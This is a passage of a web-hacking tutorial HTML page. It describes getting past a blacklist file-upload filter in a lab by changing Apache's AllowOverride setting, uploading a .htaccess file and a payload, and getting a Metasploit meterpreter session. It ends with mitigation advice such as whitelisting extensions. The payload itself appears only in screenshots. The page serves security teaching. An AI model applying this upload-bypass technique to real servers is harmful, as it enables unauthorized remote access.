<h5 class="ai-optimize-143"><span style="color: #000000;"><strong><em>Note:</em></strong> </span></h5>
<p class="ai-optimize-144"><span style="color: #000000;"><em>Many web-applications sets AllowOverride to <strong>“All” </strong>for some of their specific purposes.</em></span></p>
<p class="ai-optimize-145"><span style="color: #000000;">Let’s change it over in our webserver at</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /etc/apache2/apache2.conf</pre>
<p class="ai-optimize-146"><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-mpZFWFLoSeE/Xy1Hw9mM-hI/AAAAAAAAmy4/ysNHPSLJ6xs2bApNlJaZ2P_0V0FZt2fkACLcBGAsYHQ/s1600/105.png"/></strong></span></p>
<p class="ai-optimize-147"><span style="color: #000000;">Change it to all in the /var/www/ directory</span></p>
<p class="ai-optimize-148"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-j2ah2I4b1uM/Xy1H2hhAPaI/AAAAAAAAmy8/v-fQgsBgS78dPpWopEIKMmOdwTagIIM-wCLcBGAsYHQ/s1600/106.png"/></span></p>
<p class="ai-optimize-149"><span style="color: #000000;">Now restart the apache server with –</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo service apache2 restart</pre>
<p class="ai-optimize-150"><span style="color: #000000;">Back into our web-application. Let’s try to upload our <strong>“.htaccess” </strong>file.</span></p>
<p class="ai-optimize-151"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rAXEnR-bb4M/Xy1H7iuhwiI/AAAAAAAAmzE/GQDEJ6ETKVMsCDwyaSEykZoa223lN8KhwCLcBGAsYHQ/s1600/107.png"/></span></p>
<p class="ai-optimize-152"><span style="color: #000000;">Great!! And with the successful uploading. Let’s now try to upload our payload file over it there again.</span></p>
<p class="ai-optimize-153"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ew_chW9vq7M/Xy1IATkK3WI/AAAAAAAAmzI/M1x-CjjypdkTg-6pOotM5NuAOlK_Geb7ACLcBGAsYHQ/s1600/108.png"/></span></p>
<p class="ai-optimize-154"><span style="color: #000000;">Hit the <strong>upload</strong> button, but this time before clicking over at the <strong>“here” </strong>text, let’s set up our <strong>Metasploit</strong> <strong>framework </strong>again as we did earlier.</span></p>
<p class="ai-optimize-155"><span style="color: #000000;">Cool!! From the below image, you can see that we’ve successfully bypassed this blacklisted validation too and we are back with the new meterpreter session.</span></p>
<p class="ai-optimize-156"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-w6snLXyVjCw/Xy1GUWL6RNI/AAAAAAAAmyU/K46D1JMDuCcO8mhXI5KUB5ImiuzUSrfjwCLcBGAsYHQ/s1600/109.png"/></span></p>
<h4 class="ai-optimize-157"><span style="color: #000000;">How to Mitigate?</span></h4>
<ul>
<li class="ai-optimize-158"><span style="color: #000000;">Rather than a blacklist, the developer should implement a set of acceptable files i.e. a <strong>whitelist</strong> over in his scripts.</span></li>
<li class="ai-optimize-159"><span style="color: #000000;">The developer should allow specific file extensions.</span></li>
<li class="ai-optimize-160"><span style="color: #000000;">Only allow authorized and authenticated users can use the feature to upload files.</span></li>
<li class="ai-optimize-161"><span style="color: #000000;">Never display up the path of the uploaded file. If the review of the file is required then initially the file should be stored into the temp. Directory with the least privileges.</span></li>
<li class="ai-optimize-162"><span style="color: #000000;">Patch the server properly, not even the web application. i.e. do not allow double extensions and set the AllowOverride to <strong>“None,”</strong> if not required.</span></li>
</ul>
<p class="ai-optimize-163"><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p class="ai-optimize-164"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
